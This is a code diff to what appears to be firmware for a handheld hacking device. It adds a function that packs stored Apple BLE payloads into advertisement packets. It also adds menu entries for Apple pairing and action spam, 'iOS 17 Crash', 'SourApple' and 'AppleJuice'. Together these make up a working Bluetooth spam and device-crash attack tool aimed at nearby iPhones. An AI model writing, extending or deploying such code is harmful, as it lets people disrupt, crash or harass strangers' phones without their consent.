@@ -110,6 +110,27 @@ const char *getApplePayloadName(int index) {
     return apple_payloads[index].name;
 }
 
+bool buildAppleSpamAdvertisement(int payloadIndex, BLEAdvertisementData &advertisementData) {
+    if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return false;
+
+    advertisementData = BLEAdvertisementData();
+    advertisementData.setFlags(0x06);
+
+    uint8_t fullPayload[31];
+    fullPayload[0] = apple_payloads[payloadIndex].length + 1;
+    fullPayload[1] = 0xFF;
+    memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
+
+#ifdef NIMBLE_V2_PLUS
+    advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
+#else
+    std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2);
+    advertisementData.addData(payloadVector);
+#endif
+
+    return true;
+}
+
 bool isAppleSpamRunning() { return apple_spam_running; }
 
 void stopAppleSpam() {
@@ -296,17 +317,34 @@ void startAppleSpam(int payloadIndex) {
     }
 }
 
-void appleSubMenu() {
-    std::vector<Option> appleOptions;
-
-    appleOptions.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});
-
-    for (int i = 0; i < apple_payload_count; i++) {
-        appleOptions.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
+void applePairingSubMenu() {
+    std::vector<Option> options;
+    for (int i = 0; i < 10; i++) {
+        options.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
     }
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    loopOptions(options, MENU_TYPE_SUBMENU, "Apple Pairing");
+}
 
-    appleOptions.push_back({"Back", []() { returnToMenu = true; }});
+void appleActionSubMenu() {
+    std::vector<Option> options;
+    for (int i = 10; i < apple_payload_count; i++) {
+        options.push_back({apple_payloads[i].name, [i]() { startAppleSpam(i); }});
+    }
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    loopOptions(options, MENU_TYPE_SUBMENU, "Apple Action");
+}
 
-    loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
+void appleSubMenu() {
+    std::vector<Option> options;
+    options.push_back({"Spam All Apple", []() { startAppleSpamAll(); }});
+    options.push_back({"Apple Pairing", [=]() { applePairingSubMenu(); }});
+    options.push_back({"Apple Action", [=]() { appleActionSubMenu(); }});
+    options.push_back({"Apple Continuity", lambdaHelper(aj_adv, 9)});
+    options.push_back({"iOS 17 Crash", lambdaHelper(aj_adv, 13)});
+    options.push_back({"SourApple", lambdaHelper(aj_adv, 7)});
+    options.push_back({"AppleJuice", lambdaHelper(aj_adv, 8)});
+    options.push_back({"Back", []() { returnToMenu = true; }});
+    loopOptions(options, MENU_TYPE_SUBMENU, "Apple Spam");
 }
 #endif
